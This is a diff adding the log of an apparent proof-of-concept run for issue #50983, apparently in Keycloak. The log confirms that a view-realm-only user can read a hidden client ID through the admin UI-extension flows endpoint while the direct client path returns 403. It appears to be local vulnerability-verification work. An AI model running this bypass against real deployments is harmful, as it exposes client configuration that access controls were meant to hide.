@@ -1,0 +1,25 @@
+[EXPLOIT] Issue #50983: Admin UI flow endpoint leaks hidden client IDs
+[EXPLOIT] Hidden client : 'triage-secret-client' (uuid=fa2d137d-caf3-4277-9b02-5935036f0bed)
+[EXPLOIT] Baseline      : direct GET /clients/{id} → HTTP 403 (expect 403)
+[EXPLOIT] Flow binding  : custom flow bound to hidden client: True
+
+[EXPLOIT] Step 1: Token obtained for 'triage-viewer' (view-realm ONLY — no view-clients).
+[EXPLOIT] Step 2: GET /clients/{id} (protected path) → HTTP 403 (expect 403).
+[EXPLOIT]         Protected path correctly blocked (403). Proceeding.
+
+[EXPLOIT] Step 3: GET http://localhost:8180/admin/realms/triage-realm/ui-ext/authentication-management/flows
+[EXPLOIT]         Actor: 'triage-viewer' (view-realm only — SHOULD NOT see hidden clients)
+[EXPLOIT]         Response: HTTP 200
+[EXPLOIT] Step 4: Scanning response body for hidden client ID 'triage-secret-client'...
+[EXPLOIT]         Response body length : 1750 bytes
+[EXPLOIT]         'triage-secret-client' in response: True
+[EXPLOIT]         CONFIRMED LEAK: flow 'triage-custom-flow' usedBy.type=SPECIFIC_CLIENTS, values=['triage-secret-client']
+
+
+======================================================================
+VERDICT: CONFIRMED — VULNERABILITY ACTIVE
+confirmed: true
+Evidence: HTTP 200 + 'triage-secret-client' present in usedBy.values of /ui-ext/authentication-management/flows
+Reason:   Hidden client ID exposed to view-realm-only actor. Direct /clients/{id} path correctly returns 403.
+======================================================================
+RESULT: {"phase": "exploit", "confirmed": true, "http_status_flows": 200, "http_status_direct": 403, "verdict": "CONFIRMED", "hidden_client_id_leaked": true, "reason": "GET /ui-ext/authentication-management/flows returned HTTP 200 to a view-realm-only actor and the response body contains 'triage-secret-client' in the usedBy.values of a SPECIFIC_CLIENTS flow entry. The direct /clients/{id} path is correctly blocked (HTTP 403), confirming this is an information disclosure via the Admin UI extension endpoint that bypasses client RBAC enforcement."}
